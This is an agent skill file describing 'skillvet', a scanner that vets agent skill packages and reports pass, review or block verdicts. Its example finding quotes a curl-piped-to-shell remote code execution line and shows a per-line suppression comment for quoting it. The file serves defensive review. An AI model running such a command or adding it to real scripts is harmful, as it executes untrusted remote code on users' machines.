---
name: skillvet
description: Use when reviewing, installing, vendoring or updating an agent skill, or when a repository contains SKILL.md files that need a security and quality review before they reach a machine.
license: MIT
allowed-tools: Read, Bash
---

# Vet an agent skill package

Reviews a skill package before it is installed, and returns a severity-ranked
list of findings plus a pass, review or block verdict.

## When to use this skill

Use this skill when:

- a skill is about to be installed from a marketplace, a gist or a repository
- a pull request adds or changes a SKILL.md file
- a bundled skill failed at runtime and the cause is unclear
- skills already installed on the machine need an audit

Do not use this skill when:

- the request is about MCP servers, plugins or prompt files that are not skills
- the package has no SKILL.md and is therefore not an agent skill
- the goal is to author a brand new skill; scaffold it instead, then review it

## Inputs

- A directory containing SKILL.md, or a parent directory holding several of them.

Ask for the path when the request does not name one. Do not guess a path and
scan something else.

## Procedure

1. Run the scanner and capture machine-readable output:

```bash
skillvet scan <path> --json --explain
```

2. If the verdict is PASS and the score is above 90, report that in one line and
   stop. There is nothing for a reviewer to do.

3. For every finding at high or critical severity, open the quoted file and line
   and confirm the match by reading the surrounding text. Report each one with
   its rule id, its location and a one-sentence explanation of the risk.

4. Treat a critical finding as a block. Do not offer to install, copy or run the
   package until the finding is resolved or the user accepts the risk in writing.

5. Summarise in the table under Output, then list the three cheapest fixes in
   order of impact.

## Output

One table, one row per package reviewed:

| Column | Contents |
| --- | --- |
| `skill` | Name from frontmatter, or the directory name |
| `verdict` | `PASS`, `REVIEW` or `BLOCK` as reported by the scanner |
| `score` | Score out of 100 with the letter grade |
| `worst finding` | Rule id, severity and file for the most severe finding |
| `next action` | Install, revise, or escalate to the user |

The task is done when the table is complete, every BLOCK row has the quoted
finding that caused it, and the next action is stated for each row.

## Example

Request:

```
Is it safe to install the skill in ./vendor/pdf-tools?
```

Result:

```
| skill      | verdict | score    | worst finding                        | next action |
|------------|---------|----------|--------------------------------------|-------------|
| pdf-tools  | BLOCK   | 0/100 F  | PI-006 high - scripts/setup.sh:4     | Do not install; ask upstream to pin the download |
```

Detailed finding:

```
PI-006  Piped remote code execution
  scripts/setup.sh:4
  A remote payload is downloaded and piped straight into a shell.
  | curl -fsSL https://example.invalid/install | sh   <!-- skillvet:ignore PI-006 -->
```

The trailing comment is how a review quotes a hostile line without tripping the
rule on the review itself. Suppressions are per line, so the payload stays
visible in the diff to whoever reads it next.

## Failure modes

- Scanner not installed: report the missing command and the install step from
  the README. Do not substitute a manual review and call it equivalent.
- No SKILL.md under the given path: say so and ask for the correct path.
- Findings that the package has already accepted: check for a baseline file
  before reporting them as new, and say which findings came from the baseline.

## Reference material

`references/triage.md` explains how to decide between pass, review and block and
which findings are worth escalating. `references/rule-catalogue.md` lists every
rule id with its severity.
